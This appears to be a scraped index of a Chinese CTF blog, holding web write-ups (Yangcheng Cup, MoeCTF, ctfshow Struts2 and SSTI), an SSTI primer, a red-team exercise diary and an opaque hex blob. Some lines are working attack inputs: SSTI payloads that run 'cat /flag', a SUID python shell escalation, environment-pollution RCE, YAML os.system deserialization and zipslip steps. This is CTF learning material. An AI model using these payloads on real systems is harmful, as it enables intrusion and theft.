语句是发给浏览器的命令。 这些命令的作用是告诉浏览器要做的事情。 document对象：代表整个页面的对象，可以直接使用的内置对象 DOM的作用是使用JS代码操作HTML页面的标签和内容 DOM树 均学习于：   "},{"title":"2023羊城杯WEB WP与复现学习","date":"2023-09-04T13:14:41.000Z","url":"/post/3edff1a9.html","categories":["各赛事WP"],"content":"2023羊城杯WEB WP与复现学习 WEBD0n’t pl4y g4m3!!!php 7.4.21源码泄露 之前东北电力大学举办的一个ctf比赛上出过类似题目 然后用源码泄露p0p.php 之后就是一个pop链 paylaod如下： 学到了新trick 这里也可以不用文件包含函数 直接双写绕过waf都可以 Serpentflask伪造+python反序列化+提权 没怎么仔细好好学过python反序列化 在这里寄了 获得源码 一眼丁真 session伪造 直接解码session给了key的 GWHTNrtE8JiVyR 之后访问/src0de路由再次拿到源码 考察python反序列化 并且有waf 要bypass R 所以用o指令来绕过 或者用i指令来绕过 都是出自: 反弹shell 发现还要提权 读不了flag 因为这个题目python3.8存在suid 文件具有 SUID 权限，因此当普通用户运行它时，该程序会以文件所有者的权限来运行 所以我们可以提权 python3.8 -c &quot;import os;os.execl(&#39;/bin/sh&#39;,&#39;sh&#39;,&#39;-p&#39;)&quot; -c是命令行选项 或者更简单点python3 -c &quot;print(open(&#39;/flag&#39;).read(0)&quot; ArkNights非预期解非预期了payload:/read?file=/proc/1/environ 读环境变量就有 预期解考点: 通过&#x2F;proc&#x2F;self&#x2F;mem内存获取secretkey python的变量污染导致render可以目录穿越 任意文件读取 首先获得源码: 首先就是去伪造session 老考点了 通过计算内存偏移量来读取内存中的secretkey 读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。 /proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。 脚本如下: 然后就是我不知道的知识了 直接来看神のWP首先是python的一个黑魔法导致变量覆盖 所以利用点在这里: 其次我们是不是可以覆盖环境变量 当然神已经考虑到了： 那么假如我们想覆盖环境变量可以怎么做呢？ [[str][0]for[os.environ[&#39;BASH_FUNC_echo%%&#39;]]in[[&#39;() &#123; id; &#125;&#39;]]] 按照上述代码就可以覆盖环境变量，调用了os模块进行污染，如上代码可以rce输出id指令，但是我在题目里ban了，因此是不可行的。 这里涉及到之前idek考的一个pydash原型链污染的非预期了，是通过污染os.path.pardir这个变量来允许目录穿越的，我们污染了os.path.pardir就可以实现路径穿越了 修改的值为任意 来自： 至于为什么嘛 分析源码分析的 。。。。qwq？？？？？？？ 🐂 我记住结论了:) 因此整个步骤为: 从内存中通过偏移量读取secretkey 伪造session 然后利用python黑魔法去污染os.path.pardir 路径穿越读flag 环境给的flag位于&#x2F;tmp&#x2F;flag中 所以路径穿越即可 记得路径要url编码 真不错啊 学到知识好多！ ezyaml源码如下： 大概分析在源码注释了 大致就需要我们进行一个路径穿越将我们上传后解压的文件穿越到config/这样我们的恶意文件才会被打开并且进行yaml反序列化 考点：tar的zipslip文件覆盖，yaml反序列化 文件内容为!!python/object/apply:os.system [&quot;whoami&quot;]改为反弹shell就行 来自 我愿称之为王の宝库 之后就是打包了tar cPvf a.tar ../../config/a.yaml 然后上传 访问&#x2F;src路由 传参usename&#x3D;a 即可触发反弹shell Ez_java不会 没学 Ez_web考点： &#x2F;etc&#x2F;ld.so.preload配置文件 劫持 简单理解在这个文件中我们可以设置一些恶意的文件绝对路径 然后在我们输入指令时 就会先预加载ld.so.preload这个文件中的内容 达到劫持效果 所以这道大致题目思路: 先由msf生成一个木马 然后上传上去 然后在自己vps 起msfconsole 设置好相应的参数 开始监听等待反弹 然后在题目中随便执行一个指令就会被劫持了 由于我没有环境只能大致复现一下 因为复现还给自己kali虚拟机整崩了 参考于:     都是上好的文章 MiscEZ_misc跟之前*CTF考点一样 CVE-2023-28303  直接用工具梭哈恢复就行了"},{"title":"ctfshow-java struts2框架一览","date":"2023-08-26T03:28:13.000Z","url":"/post/faf20676.html","categories":["ctfshow"],"content":"ctfshow-java 前言硬着头皮学习 好像这个系列讲的全是struts2框架漏洞 就当作是长见识了 Struts2是java语言写的的一个基于MVC设计模式的Web框架 struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%&#123;value&#125;并重新填充相应的表单数据。 这里的%&#123;value&#125;简单理解就是和flask的模板注入&#123;&#123;&#125;&#125;差不多 会对里面的内容进行解析 因此我们可以利用其进行命令执行 OGNL表达式中三个符号 % # $ 的含义 其次struts2引擎是我们熟悉的tomcat github上有专门针对struts2的poc  不过我还是自己手动捯饬一下 WEB-279(S2-001)获取一些敏感路径的payload: 本题payload: WEB-280(S2-016和S2-005)S2-003 因此我们可以利用unicode编码和8进制来bypass # 这道题目只能用这个poc做出来 网上的payload都没有回显  然后S2-016和S2-005都能打通 或者 post传参 需要注意的是我们的命令必须要经过url全字符编码才能成功 也就是我标蓝这里 途中命令为env 参考: WEB-281(S2-007)原理: 当配置了验证规则 -validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回 当用户 age 以str而不是的形式提交时 int，服务器将拼接 “‘“ + value + “‘“ 代码，然后使用OGNL表达式对其进行解析。为了成功完成任务，我们需要找到一个配置有相似验证规则的表单字段，以产生转换错误。然后，您可以通过注入SQL单引号的方式注入任何OGNL表达式代码 影响版本：Struts2 2.0.0 - Struts2 2.2.3 payload： WEB-282(S2-008)原理: S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。 影响版本：Struts 2.1.0 – 2.3.1 这道题目很奇怪只能用上面的poc脚本才能打成功 看了脚本的构造 payload如下 手动输入就是没有回显 反弹shell也是一样 WEB-283(Struts2 showcase远程代码执行漏洞)原理： 这个漏洞再次来源于s2-003、s2-005 参考Struts2漏洞分析之Ognl表达式特性引发的新思路，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中 Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\\u0023或\\43进行绕过；于是Struts2对s2-005的修复方法是禁止\\等特殊符号，使用户不能提交反斜线 但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1的方法来执行它，从而绕过官方对#、\\等特殊字符的防御 通过Struts2框架中ParametersInterceptor拦截器只检查传入的参数名而不检查参数值的方式进行构造OGNL表达式从而造成代码执行 payload: 来源于 WEB-284(S2-012)原理: 如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 $&#123;param_name&#125; 作为重定向变量 比如: 这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。 payload： WEB-285(S2-013)原理： Apache Struts2的s:a和s:url标签都提供了一个includeParams属性。此属性允许使用的值包括none、get、all。当该属性被设置为get或all时，Apache Struts2会将用户提交的参数值作为Ognl表达式执行。攻击者可以提交带有恶意的Ongl表达式，达到执行任意Java代码的目的。只要基于Apache Struts2开发的JSP代码中使用了url&#x2F;a标签并且设置了includeParams属性为all或get，远程攻击者即可利用此漏执行任意命令。 payload: 参考: WEB-286(S2-015)原理： 在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。 影响版本： Struts2.3.5 – 2.3.31 Struts2.5 – 2.5.10 你妈 说是S2-015的漏洞 但是poc要用S2-045才能打通 而且用poc脚本打通S2-015里面没有flag 脚本或者 payload: 来源： WEB-287(S2-016)原理： 问题主要出在对于特殊URL处理中，redirect与redirectAction后面跟上Ognl表达式会被服务器执行 在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令 所以，访问表达式即可执行OGNL表达式 payload: 需要注意的是提交的时候需要全字符编码 WEB-288(S2-019)原理： 要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中 payload: 来源: 主要url全字符编码的时候一定要把里面的&amp;别编码不然会混淆 WEB-289(S2-029)原理: Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估 例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行 影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外） payload： WEB-290(S2-032)原理: Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:的方式来调用名字是的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞 影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) payload： WEB-291(S2-033)原理: 当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行 影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3) payload: WEB-292(S2-037)原理: 当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式 影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外） payload: WEB-293(S2-045)原理: 在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵 恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令 影响版本：Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10 payload: WEB-294(S2-046)原理： S2-046漏洞和S2-045漏洞很相似，都是由于对Header某个字段信息处理发生异常，错误信息连带着payload同过buildErrorMessage函数带入LocalizedTextUtil.findText造成的。 但是不同的是，这次漏洞的触发点在Content-Length和Content-Disposition字段的filename中。 payload: 不懂。。。 WEB-295(S2-048)又是showcase了 原理: 漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用 而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击 影响版本: 2.0.0 - 2.3.32 成功执行 payload: 注入点在第一个栏里 flag就是这段 因为它报错不能解析我们的uuid WEB-296(S2-052)这题直接用脚本poc打就行了 看好多师傅payload打不了 WEB-297(S2-053)原理: Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞 payload： 直接rce env找不到flag 反弹shell env才有flag 逆天 后言也就当作是熟悉了 只是payload的搬运工:)"},{"title":"ctfshow-ssti","date":"2023-08-23T06:06:04.000Z","url":"/post/7eb33f7a.html","categories":["ctfshow"],"content":"ctfshow-ssti 感觉这块网上直接找payload之外 没有真正理解答案 重新学习一下 顺便也要适应python了 WEB-361无过滤 payload:&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125; 或者用lipsum包和cycler库 或者用控制块 WEB-362(过滤了os.wrap_close)用上一题的其他方式就行 WEB-363(过滤单双引号)get传参方式绕过或request.cookies.x都行 需要注意的是url_for.__builtins__下没有os 但是可以用eval 还有就是通过config配置信息截字符 截取到os ?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2b(config.__str__()[42])]&#125;&#125;这里需要注意就是%2b是 +的url编码 不加的话就会报错 WEB-364(过滤了args)也就是我们不能get传参了直接ban了 request.args 其实还可以用cookie 第二种： values可以获取所有参数 绕过args WEB-365(过滤了方括号)payload_1values传参 values 没有被过滤 或者cookie都行 payload_2字符串拼接 []可以用.或者__getitem__本质就是它 其他师傅的脚本如下: 然后用~连接起来 WEB-366(过滤了下划线)可以用过滤器 WEB-367(过滤了os) lipsum.__globals__.get(os).popen(c=cat /flag)最终构造是这个 由于[]也是被waf了所以我们可以通过get(os)方式 之前我们都是lipsum.__globals__[&#39;os&#39;] 也算是一个小trick WEB-368(过滤了左花括号)用&#123;%print()%&#125; WEB-369(过滤了request)payload_1截取配置config构造 这类下划线被ban了 不能用__str()__ 所以就要用过滤器了 获取字符串后本来要用__getitem__问题是_被ban了 所以这里需要转换成list然后用pop()就可以得到我们想要的字符 师傅们的payload: 可以来剖析一下 总体是用(config|string|list).pop(下标).lower()这种方式去截取我们想要的字符 然后转为小写 用~连接起来 这里还是存在那个trick 要用get(&#39;os&#39;)去代替[&#39;os&#39;]因为方括号被ban了 payload_2 解释 WEB-370(过滤数字)主要思路是就是用count过滤器搭配join计算字符长度获取数字 然后思路和上一题一样 payload: WEB-371(过滤print无回显) 先构造出数字0-9 然后去截取我们想要的符号 用curl外带flag 构造出curl  一开始自己一直在构造bash反弹shell的 构造了老半天 md发现-&amp;截取不到 没有这两个符号 太难过了 不过对过程有了更深的理解了 WEB-372(过滤了count)用length替换就行了 然后继续curl外带 和上面payload差不多 成功 后言虽然这是一个老生常谈的题目 但是自己对payload不太理解 这次刷过之后 会好很多 不至于看不懂 冲就完了"},{"title":"Flask SSTI简单学习","date":"2023-08-18T10:37:27.000Z","url":"/post/c52c3ed.html","categories":["知识学习"],"content":"Flask SSTI SSTI前置知识 了解一些python的魔术方法和内置类 class返回该对象所属的类 base__和__bases都是用于获取类的基类 基类也叫父类 但是base是以字符串形式 而bases以元组的形式返回一个类所直接集成的类 mro返回解析方法调用的顺序 （当调用_mro_[1]或者-1时作用其实等同于_base_） subclasses()获取类的所有子类 这里需要知道object是所有类的基类 所以object下子类是所有类 init所有可被当作模板导入的都包含__init__方法，通过此方法来调用__globals__方法 globals该方法会以字典的形式返回当前位置的所有全局变量 所有函数都会有一个 globals 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典 builtinspython2 中为__bulitins__和__bulitin__builtins 实际上是一个指向或者说引用 builtin 的（有点类似于软链接） 这里 builtins 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。 python3中为__builtins__和builtins builtins 代替的 builtin 在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 dir(builtins) 可以查到。 import()该方法用于动态加载类和函数 如果一个模块经常变化就可以使用__import__()来动态载入 语法__import__(模块名) 总体思路就是： 过滤器变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数 可以链接多 个过滤器 一个过滤器的输出应用于下一个过滤器。 attr()用于获取对象的属性 常见于点号.被过滤，或者点号.和中括号[]都被过滤的情况 format()简单理解就是格式化字符 first() last() random()返回第一个值 最后一个值或者随机 随机的话需要我们跑个脚本就有几率获取到我们想要的内容了 join()字符串拼接 lower()转化为小写 replace() reverse()替换和反转还原回我们要用的字符串 string功能类似于python内置函数 str有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。 select和之前的结合起来有大作用 然后我们就可以切字符了 list转换成列表 更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了 其实更多的是可以用list的函数了 变量除了标准的python语法使用点.外，还可以使用中括号[]来访问变量的属性 拼接： 反转&quot;__ssalc__&quot;[::-1] 其实是python的切片 ascii转换 编码绕过 在jinja2里面可以利用~进行拼接 SSTI语句构造首先就是要拿到当前类 拿object也就是需要object然后再从它的子类中找我们可以利用的 拿基类的子类用__subclasses__()获取子类 大多数利用的是os.wrap_close这个类 然后就是来找我们想要的内容 调教gpt帮我们写一个 只要将前后的[]删去 然后放到content.txt就能自动帮我们标上序号了 然后序号要-1 因为脚本是从1开始的 __init__方法进行初始化类 然后再调用__globals__获取到方法内以字典的形式返回的方法、属性 现在用命令执行函数或者模块就行了 有一个很厉害的模块是buildtins里面有eval()等函数可以用来rce SSTI常见的绕过方式绕过. 前面也举了很多例子 可以用[]来代替 可以用attr()过滤器 绕过_ 通过list获取字符列表，然后用pop来获取_ 其实就是去截_ 通过十六进制编码 绕过[]可以使用__getitem__魔术方法 简单说就是把中括号转换为括号 其实本质是我们用[]的时候 调用的就是这个魔术方法而已 绕过花括号可以用&#123;%%&#125;bypass 这时就要在里面用print()来打印结果了 也可以借助for循环和if语句来执行命令 注意这里循环语句 有&#123;%for&#125;`就要有`&#123;%endfor%&#125; 有&#123;%if&#125;` 就要有`&#123;%endif%&#125; 绕过单引号和双引号当单引号和双引号被ban时，我们通常采用request.args.a，然后给a赋值这种方式来进行绕过 原理 如果args也被禁了 可以采用request.cookies和request.values，他们利用的方式大同小异 绕过数字可以通过count来得到数字 在这里join将字典的键连接起来 然后count 绕过关键字和上面相同的原理 join拼接 常用payload 后言：做题慢慢补充 参考： "},{"title":"第一次hwの经历","date":"2023-08-16T15:26:04.000Z","url":"/post/ccf2062.html","categories":["感悟"],"content":"突发恶疾 暑假到一半突然说要回学校参加hw，一开始在去与不去的纠结中，但是由于学习的好奇心驱使和难得的机会，最后还是报了名，虽然五天陪跑，干的都是纯纯的体力活，但是总体还是很不错的一次学习经历！ 因为话题比较涉密，原谅没有图片的纯文字发病过程，请护眼。。。 赛前因为突然来消息没有提前买机票，隔几天买机票的话就很贵，花了我整整1500&#x2F;(ㄒoㄒ)&#x2F;~~ 穷狗的眼泪落了下来 然后就是回寝室，最恶心的是还要申请宿舍通水电，还要至少两个人在一个寝室，是牛魔脑子有病，都是成年人恶心人干嘛，好在是巧妙的化解了 不知道咋了回来我的小电瓶车它不动了，太夸张了，我的爹他不动了，修车的人因为是假期也不在，很难想象我是怎么在大热天里徒步在校园中穿梭，那共享车的车速和位置真的是太让人逆天不想碰。 总的一句话就是事事不顺。。。。 不过这些问题都不大 被 ？围绕的五天开始三天吧估计是，毫无头绪，一开始就是照着网上教程去收集子域名，收集ip，很费劲，好在好像是第二天，发了资产表，终于是有点系统性整理好的信息了 也是借着这次的hw，对于域名 子域名 ipc段 端口 fofa 宝塔等 有了更深的认识 弱口令感觉经过多次hw之后，相较于之前的话，会少很多，这次我找到的都是未授权访问，相较于弱口令，这次未授权访问的洞是更多的。 当然入口都是这些不起眼的小漏洞 但是就是因为这些小漏洞会引发一连串的效应 而且如果弱口令不是类似于admin&#x2F;admin这样小白密码，那么要想通过社工管理员去针对的做一个密码本是比较困难和麻烦的。 其次就是要对已经收集的一些资产信息进行整理和统计，这样可以避免重复性操作，也会使得整个流程进行的更有条理 发力是在最后一天好像是找了三个未授权，然后其中一个里面有着40个摄像头美美的吃了一波分 参加hw的师傅们都太强了，我们学校的👴们也很🐂，都是大佬，羡慕捏，能和厉害的人一起学习真的是一件很cool的事情 其次还有意外的收获~ 结尾学习知识本就是个当孙子的过程，希望未来的自己也能够及时抓住机会，不要害怕失败吧，毕竟相比于成功在我身上失败总是来的更频繁些，但是能学到新东西，失败又如何呢。 Keep Hacking！"},{"title":"Moectf2023 WEB方向WP","date":"2023-08-16T10:24:37.000Z","url":"/post/a19b908f.html","categories":["各赛事WP"],"content":"持续更新 完善自己 新生赛都打不了一点 这次靶机开启方式不错捏 挺新颖的 http正常请求参数考点 payload如下 Web入门指北pdf末尾有一串16进制码 转了就行 cookie随便注册个账号然后登录将cookie base64解码 改成如下 然后打入cookie 访问&#x2F;flag 即可 彼岸的flagF12 找就有 gas!gas!gas!看清规则 油门和抓地成反比例 方向要反打 其次要在0.5秒进行下一步 直接脚本梭哈 moe图床给了源码upload.php 这道题一开始没做出来 有点被吓住了 后来发现没啥 比较重要的是这一块 然后其实我们将上传文件改为1.png.php即可 他只会检测索引为1的后缀是否为png 可能是apache的文件名解析特性吧 了解你的座驾一道xxe payload: 值得注意的是要url编码后打入 不然没结果 大海捞针?id=11-1000直接bp爆破就行了 大海捞针表面是文件上传其实就是文件包含 然后就是hash处理缺陷 数组绕过就行 经典题型了 夺命十三枪一道反序列化字符串逃逸 nm新生赛做这个是吧 给了源码: 呢我们的最终目的就是最后一块 但是我们只能get修改Chant值 不能修改Spear_Owner 再看一眼有经典的先serialize 后unserialize 并且其中还有字符替换的 所以直接就能想到是反序列化字符串逃逸了 需要将&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;一部分塞入一共35个 payload如下 signin给了源码： 有点糊涂 之后看看其他师傅的wp理解一下吧 前面的一些处理理解起来有点不懂 登录逻辑 确认了json里username和password不能相同后，经过一个hash函数 这一坨处理是消除了类型限制，因此使用不同类型的username和password即可 经过decrypt函数的五次base64后post 出去旅游的心海抓包可以发现一个路由wp-content/plugins/visitor-logging/logger.php 获得源码 time处可以进行sql注入 这里我用的是报错注入 就是有一个问题这里报错注入最后flag显示不出来 要用mid函数去适当的调整 当时就是栽了跟头 还有一种就是直接(user())进行查询就行 。。。 moworld一道很综合考察内网渗透的题目 非常的不错 可以学到很多知识 压缩包密码为上一题的flag 首先是一个flask框架 给了提示需要我们去伪造session 可以看到session的构成 然后去网上找了下 发现是某次的美团CTF上的题目 直接拿来脚本用即可 爆破出后四位 或者自己让gpt写一个字典慢慢跑都行 然后伪造session 可以看到提示 给了我们ping码 就可以知道它开启了debug模式 直接访问/console路由 进行反弹shell 获得第一段flag 再查看/readme并且得到提示 ifconfig 命令没有 还可以用hostname -I 获取存活的ip地址 可以得到两端 然后进行fscan 扫描c段 获得密码22-3306-6379-8080 再将压缩包中flag解出 获得提示 那么我们要去连接它内网下的其他服务器 我们就要进行内网穿透做隧道 首先就是用一台vps去连接跳板机 然后通过跳板机做隧道将内网中服务器暴露在公网中 这样我们就可以用我们的物理机去连接到了 大致就是 172.21.0.2:xxxx(内网服务器)-&gt;跳板机ip:xxxxx-&gt;我们的vps&lt;-某种⼯具连接这个隧道&lt;-攻击机 这里我用的是NPS 一开始我用的tcp隧道 就是我们可以直接去连接我的vps和指定隧道端口直接连接他的内网服务器 但是这里我并不能连接成功redis 就很奇怪 之后我用socks并且proxifier 做了个代理 就不用去用我的vps ip了 直接就是127.0.20.x:3306就可以连接到他的内网中mysql服务器 配置什么的都要做好 包括容许走它的隧道应用等 连接上去之后 可以在表中发现第二段flag 第三段是redis公钥登录服务器 大致过程与条件： 客户端生成私钥和公钥，将公钥拷贝给服务器端 客户端发起登录请求 服务器端根据客户端发来的信息查找是否存有该客户端的公钥， 客户端收到服务器发来的加密后的消息后使用私钥解密，并把解密后的结果发给服务器用于验证 服务器收到客户端发来的解密结果，与自己刚才生成的随机数比对 条件： Redis服务使用ROOT账号启动 服务器开放了SSH服务，而且允许使用密钥登录。 首先用工具连接到redis服务器 只要隧道搭建没问题都能连上 就是这个环境太折磨人了 不过也没办法 能体会到出题人的一片苦心 只怪搅屎棍太多了 素质太差 需要注意的是ip会发生变化是动态的 连接不上的的时候一定要去再看看 而且题目环境会隔一段时间重启 首先在自己攻击机申请公私钥 将私钥保存在自己物理机上 然后用私钥ssh 22端口链接即可 然后就能得到最后一段flag 被环境折磨。。。 收获还是颇多 很值得"},{"title":"hw工具箱","date":"2023-08-06T13:27:25.000Z","url":"/post/b361a80b.html","content":" 7e7a80f49269c6c502f4158d2f64667fa44213fb46b4c282069abacec26bd2620e1505ce5d34c7c3dfce754cc5b4f5757818d39e25c3cced57cde7a56bbaf31c93bc67c5ea5129b297e9b4c199ce99280efb236a4f09316e4ede5d51602b28b7be8979a4406e816f3bfc6a58eddfec6864066521240a1f87efb396fb5e47ccce2a970975e990872f693e6868803c65454ecd161d344efa63525b63787898c5d212aa49ec8e113f1a67a35dea6045f480eadb42d28ac3c0b8344cf05334ee6bef796c17c3684a5803bb6078f88ee854f0de9ee719455e9024a0a63ff08652554f421859e3c62a1ec09c8a52ffa3df490e75acde080fc310b7d578ed723257210dfa829cc87460e89d8c936350e094c298fc34a98711332fa4b816eef9d6067d302068f2723468c3858b6581ad91115335493a63836f2a2ddaa0437231cfc25a5176dfa5593a499ac5be96df0147522bb7ba83e991b8f4a5953fbbfee699d95f7b75c962fcf8ff6cb8e613a07857ae804dbefbee9670f1b8c3efea8ea880f47a997fa446d74f781d0293c1cc14cd94b08c1e17a495ce9f5e0548d4f4e348c042841ba84d27f4be9f63ef4aeb1d0bff57cec763cf50c0669e0a2cf3362e63dbb0a24fef5872f53104fb54e044da0eb690341ea0007ce492cc87af79bd7ecb98900d300808ddd34b156dec2a6084731b97e99d90806b1aff5364811f9278afb9a07fbb79b91d2b82e7caae7d86516924d3ffc4b5d00f5bf1b1befdf58f7b28f3feb6c9cb1d69827f1b4745bd97e1e30b0f95020de132e61b87256d4a1113421f1e551210ceccd8a09d450e6748e5dc8ac73f36e4e58dfb054572c5c0ca706b88a2fb864ca653180f32c9b0893747d07386490c39095980d1f6b8227016707c9f01b2858b19e2f6df963c4b56f53037ff186b6ab77326c42433578af1610e429bbc662c9301d84a46f5000b123ef7ba83351193331ad81de91289f809b4435a8ca688b4464eacd8d74ad6f0e5c3b4ee800fb72f63c01484f521b3337b8f7571e44829963a3963ab7ecdac9aefb10d52d4241f69a18af478bf244d9f8a675c6c03a563db67b87fbbf0b0aa1a13e53bb009d700977318544ee13e2597ca1aa6b8ff22c7bcf8808b0a56da04b7518535aff572a8933e15fc4b4bab6494ac368b295a47e90b270ccaa739ae7bcc3e45e3a09f8dc40d1e806c7361db692e7307882546a9b6fb7b8eba45e5147b6a81bad75bc522980ba4a004104f57396c045371e466dd93f571ce6a7278e0ffedfa6fb34531d8f928b6f9fbc879ce7d86252eb7703acf4bb498081508573291792fc172aba97d95ef2657b31f5bd476c4c2f23e98856346e1756d86a7efc6848ab02d00efecd48ab8b74e74bc6391802b406ddc1ae8aeed180bc46e96f80ef557b74d204f98156fd9783bd76525f43b77b62f290873db4aa4740d12f4f230f31c539b6cfc9840d42b2eb298b68c2b6ac702eea2a04ea450c307fe0be169825969e53cf82eada1d93fec5a10a3635bc4ef88bfdc9a18b7b5c76e719657461f8fad590ddfd9b9266a7d3b58b0282e625ca7b0a25b384b0e33acee2d6315ede1f1fa22ff39a5bfcfb2266b2f027c44918029d14486c402ac91606bd62f8150d1c0a1469766a52d5e509e1e6ef406078704ab97a71e197ac220e7a8a91e5ea438c68ea257d4a9ba27f0bcb79825fc375c8c1883dab5ac8c06943783564f5b4bca4955da2997f8522f42d2ce8366a12472a5cfa4ec1753067474708bd8dc9343e106c0d5a5f1e3bdefdcd619fc5ef0302064c6d0464ebe06fcc3e24689d13d624f3cb461dad9e4f09dfd616da5cfb62f56e12428eb3f3547356dc7e452f34d746e324ec61755a645769d0a89771b9f8048606d0b1f104ae906f1ca21bd244311815d8b371212ed21531c27cc0051fab079fbd309c6ef7e4f6115672efd0352bb4fc5ba75ee2f16e55b37aaaa2641feb8bf81010ad43f3b2c60eea70bbe1582f411e31a84a5ba282b4d28c1e2197eadb5de2a4dc47309c48198d875771d4d3199b4dc56d526528ea647b157a40e5a679353328f572ef368d680cbe85e96db5df51e73aa88cb473672686c43e5f552ede5f330a76b94b999b202f4c4cde76dd4645c7b37dae85f7f6ced3ce32a3fae548f7bf0e87bf55bf8e5c3342653888a472fa21f423962bad67a7e9ad14323560cb435e3f6f17b02a1e242a71916012178cae6817b961772a5f6a20a8426ae093064ee5b551d6062d7f8d4c47cd98d8282b48de0d4d2812fa9f269e228aaf2946874e02a0ed41de09e14e0eb3ce9bd6d03b40754188e76bd464b3f288fac88c8401b05b8920fc94d5b1b87c97e33de9d212442a978472090ad41cdde8bc11ac782ff7909389f14cfc141f844db43e0cb36ed7c8f15bc2ff43cc6e5e8518e8e68f809981b4fc7acc17cbfb5cfa637c77296a86b508f1d700b06efc3c5d5aeeb85c9243eb8048f9907cd6d6dfcecbc3d5fc56f408cf8ebcaf8104d04a7ffb2ac50ad8e02f68fd2b712417539b96d76126d53d0fbc634c5c4f08ec47d4a7858d6ae19765557480d8fca84f83a0affe5b7cef870168b40343c0e53a54b27adc3ba782332d199a2f4170ea2302b67db13a7e138e4edd05c7d43cdfa9c8b3cfa0b80c39fe99e293cbf9fb950a591ac11208ce4e820db2eaa2a8ce3abb4d5f2b974c1e10076c986de1d19b25ce488cdaf389fa47e03e0517194c3886d29642437d2ccdce801dbe953fae488c4487c40d5599cabb769e23f619840d9cfb86bee138ee24793a68886269e6824d3f4a5c02103c103539ee0083406eab3ab9bd945d1479b7e58062db2d117f74dbe9839f9b33b512d753d1cd4be90a6b681137f5dde8bbb8655eae36cf6de00ee0ea182a60bb6250e2c0d8fbd646fa98efabf4de5f949e824d4dbfbaa0413c987523b3d052a96f6e9fcc8de94e66ee520791e5cf4e7be8a96b36a81a151ec9a93e3e7e8c2342146008e93274c842c115afb500189a9ad3642081b8e361b3c0acbae19f15d316fb19f46b7913c8187cae35f117461c72a1b58e62331b527b52bdef4b1463f8fec277390be23a60d225a37c85ff4d7d19f26dd9c410d42e19f